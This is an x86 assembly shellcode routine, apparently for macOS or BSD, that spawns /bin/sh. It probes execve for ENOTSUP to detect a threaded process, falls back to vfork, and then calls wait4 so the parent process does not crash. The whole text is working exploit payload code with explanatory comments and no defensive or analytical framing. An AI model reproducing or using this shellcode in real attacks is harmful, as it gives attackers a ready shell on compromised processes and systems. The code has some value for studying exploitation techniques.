_shell:
	;; Test if vfork() will be needed.  If execve(0, 0, 0) fails with
	;; ENOTSUP, then we are in a threaded process and need to call 
	;; vfork().
	xor	eax, eax
	push	eax	; envp
	push	eax	; argv
	push	eax	; path
	push	eax
        mov     al, 59  ; SYS_execve
        int     0x80
	nop
	nop
	cmp	al, 45	; ENOTSUP
	jne	.execve_binsh
		
.vfork:
	mov	al, 66	; SYS_vfork
	int	0x80	; vfork()
	cmp	edx, byte 0
	jz	.wait
	
	;; Both child and parent continue to run execve below.  The parent
	;; fails and falls through to call wait4(), the child succeeds
	;; and obviously doesn't call wait4() since it has exec'd a new
	;; executable.

.execve_binsh:
	xor	eax, eax
	push	eax	   ; "\0\0\0\0"
	push	0x68732f2f ; "//sh"
	push	0x6e69622f ; "/bin"
	mov	ebx, esp
	push	eax	; envp
	push	eax	; argv
	push	ebx	; path
	push	eax	; spacer
	mov	al, 59	; SYS_execve
	int	0x80

.wait:
	;; Wait for child process to exit before continuing and crashing
	xor	eax, eax
	push	eax
	mov	ebx, esp

	push	eax	; rusage
	push	eax	; options
	push	ebx	; stat_loc
	push	eax	; pid
	push	eax	; spacer
	mov	al, 7
	int	0x80
